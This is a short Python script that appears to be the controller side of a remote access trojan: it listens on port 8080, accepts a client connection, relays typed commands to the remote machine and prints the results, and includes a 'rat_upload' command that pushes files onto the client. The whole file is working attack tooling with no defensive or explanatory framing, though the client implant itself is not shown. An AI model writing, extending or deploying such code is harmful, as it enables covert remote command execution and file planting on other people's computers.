import socket

sc = socket.socket()
sc.bind(("", 8080))
sc.listen(3)
conn, addr = sc.accept()
print ('connected:', addr)
def refuse():
    conn.close()
    exit()

def uploadfile():
    path = input("[PATH] -> ")
    cliname = input("[NAME ON CLIENT] -> ")
    conn.send(cliname.encode())
    print(path + " " + cliname)
    fl = open(path, "rb")
    l = fl.read(1024)
    while (l):
        conn.send(l)
        l = fl.read(1024)

def commands():
    while True:
        try:
            comm = input("[COMM] -> ")
            if len(comm) <= 0:
                commands()
            elif comm == "rat_upload":
                conn.send("uploadfile".encode())
                uploadfile()
            elif comm == "refuse":
                refuse()
            else:
                conn.send(comm.encode())
                print (conn.recv(1024).decode())
        except:
            print ("CONNECTION REFUSED!")
            conn.close()
            break
commands()
